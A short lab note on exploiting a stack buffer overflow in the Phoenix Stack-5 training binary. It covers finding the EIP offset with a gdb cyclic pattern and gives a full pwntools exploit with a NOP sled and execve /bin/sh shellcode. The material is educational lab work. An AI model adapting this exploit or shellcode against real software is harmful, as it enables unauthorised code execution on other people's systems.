## General Thought Process
- Find the offset to overwrite eip
- Find the address where eip is saved on the stack (using breakpoint to ret instruction in the called function)
- Now create payload starting with padding then overwrite the eip so that it lands somewhere in between nops which will placed on stack right after saved eip, and after the noops is our shellcode

## Example (Exploit Ed, Phoenix Stack-5)
- Finding the offset
```
(gdb) pattern create 200
(gdb) r < <(echo 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab')
```

![[Pasted image 20201113202623.png]]

![[Pasted image 20201113204033.png]]
`Offset - 140`
- Exploit 
```py
#!/usr/bin/python
from pwn import *
target = process('/opt/phoenix/i486/stack-five')
payload = 'A'*140  #padding
payload += p32(0xffffd70c+30) # address somewhere in between nops
payload += '\x90'*400 #  no ops
payload +=  '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' # shellcode
target.sendline(payload)
target.interactive()

```
